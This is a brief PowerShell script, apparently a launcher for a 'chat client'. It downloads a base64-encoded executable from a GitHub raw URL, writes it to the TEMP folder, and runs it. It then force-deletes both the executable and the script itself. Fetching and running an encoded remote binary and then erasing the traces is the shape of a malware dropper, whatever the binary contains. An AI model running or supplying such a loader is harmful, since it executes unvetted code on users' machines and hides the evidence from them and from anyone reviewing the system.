$exePath = "$env:TEMP\chatclient.exe"

$exe64 = (Invoke-WebRequest "https://raw.githubusercontent.com/niggvard/ChatTest/refs/heads/main/chatclient.exe.b64").Content

[IO.File]::WriteAllBytes($exePath, [Convert]::FromBase64String($exe64))

Start-Process -FilePath $exePath -Wait

Remove-Item $exePath -Force -ErrorAction SilentlyContinue

Start-Sleep -Milliseconds 500
Remove-Item $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue
